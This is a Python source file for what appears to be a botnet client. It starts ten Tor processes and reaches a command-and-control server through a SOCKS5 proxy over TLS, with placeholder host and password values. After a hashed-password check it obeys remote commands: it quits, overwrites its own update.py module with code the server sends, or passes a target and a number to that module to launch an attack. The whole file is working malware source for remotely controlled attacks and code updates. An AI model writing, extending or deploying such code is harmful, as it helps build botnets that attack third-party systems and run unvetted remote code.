import os
import ssl
import time
import socks
import update
import sys
import hashlib
from multiprocessing import Process

server_password = "ADDMEZUBUPASSWORD"

if len(sys.argv) == 2:
    host = sys.argv[1]
else:
    host = "ADDYOURHOSTNAME"


class Client:
    def __int__(self):
        self.main()

    def connet(self, host=host, porta=80):
        socks_socket = socks.socksocket()
        socks_socket.set_proxy(socks.SOCKS5, "127.0.0.1", 9152)
        socks_socket.connect((host, porta))
        return socks_socket
    def handler(self, cliente_socket):
        print(7)
        count = 0
        while count < 100:
            count += 1
            password = cliente_socket.recv(1024)
            print(count)
            if password:
                try:
                    password = password.decode().split("|PASS|")[1]
                    password = password.encode("utf-8")
                    if hashlib.sha256(password).hexdigest() == server_password:
                        package = cliente_socket.recv(1024)
                        if package:
                            package = package.decode("utf-8")
                            if len(package.split("|")) > 1:
                                package = package.split("|")
                                if package[1] == "QUIT":
                                    return
                                elif package[1] == "UPDATE":
                                    size = int(package[2])
                                    data = cliente_socket.recv(size)
                                    file = open("update.py", "wb")
                                    file.write(data)
                                    file.close()
                                elif package[1] == "ATTACK":
                                    print(package[2])
                                    print(package[6])
                                    update.main(package[2], int(package[6]))
                    else:
                        print(password)
                except Exception:
                    pass

    def main(self):
        global server_password
        global host
        os.system("./tor -f tor_client/torrc.1 --quiet &")
        os.system("./tor -f tor_client/torrc.2 --quiet &")
        os.system("./tor -f tor_client/torrc.3 --quiet &")
        os.system("./tor -f tor_client/torrc.4 --quiet &")
        os.system("./tor -f tor_client/torrc.5 --quiet &")
        os.system("./tor -f tor_client/torrc.6 --quiet &")
        os.system("./tor -f tor_client/torrc.7 --quiet &")
        os.system("./tor -f tor_client/torrc.8 --quiet &")
        os.system("./tor -f tor_client/torrc.9 --quiet &")
        os.system("./tor -f tor_client/torrc.10 &")
        time.sleep(10)
        try:
            while True:
                socks_socket = socks.socksocket()
                socks_socket.set_proxy(socks.SOCKS5, "127.0.0.1", 9152)
                socks_socket.connect((host, 80))
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                context.load_verify_locations(cafile="cert.pem")
                #context.check_hostname = False
                context.verify_mode = ssl.CERT_REQUIRED
                cliente_socket = context.wrap_socket(socks_socket, server_hostname=host)
                proc = Process(target=self.handler, args=(cliente_socket,))
                proc.start()
                proc.join()


        except Exception as e:
            print(e)
            time.sleep(10)
            self.main()
            pass


aa = Client()
while True:
    aa.main()
